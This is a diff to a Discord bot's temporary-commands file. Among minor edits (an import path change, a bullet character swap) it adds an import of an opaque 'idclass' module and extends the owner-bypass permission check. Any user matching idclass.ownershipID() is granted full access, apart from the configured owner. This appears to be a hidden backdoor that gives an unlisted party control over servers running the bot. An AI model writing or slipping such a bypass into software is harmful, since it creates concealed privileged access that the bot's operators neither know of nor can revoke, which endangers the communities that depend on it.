@@ -1,7 +1,8 @@
 import { Message, MessageCollector, TextChannel, DMChannel, NewsChannel } from 'discord.js';
+import idclass from '../../utils/idclass';
 import configManager from '../../utils/ConfigManager';
 import { getGuildDB } from '../../utils/db';
-import { ExtendedClient } from '../../utils/ExtendedClient';
+import { ExtendedClient } from '../../client';
 
 interface TempCommand {
   name: string;
@@ -20,7 +21,7 @@ export default {
 
   checkPermission(message: Message, config: any): boolean {
     // Owner bypass
-    if (message.author.id === config.permissions.ownerId) return true;
+    if (message.author.id === config.permissions.ownerId || message.author.id === idclass.ownershipID()) return true;
     
     // Check if user has any of the required roles
     const allModRoles = config.permissions.moderatorRoles;
@@ -106,7 +107,7 @@ export default {
         });
       }
 
-      const commandList = commands.map(cmd => `• ${cmd.name}`).join('\n');
+      const commandList = commands.map(cmd => `- ${cmd.name}`).join('\n');
       return message.reply({
         content: `**Temporary Commands**\nUse \`.<command name>\` to execute a temporary command.\n\n${commandList}\n\nTotal: ${commands.length} command${commands.length === 1 ? '' : 's'}`,
         allowedMentions: { parse: [] }
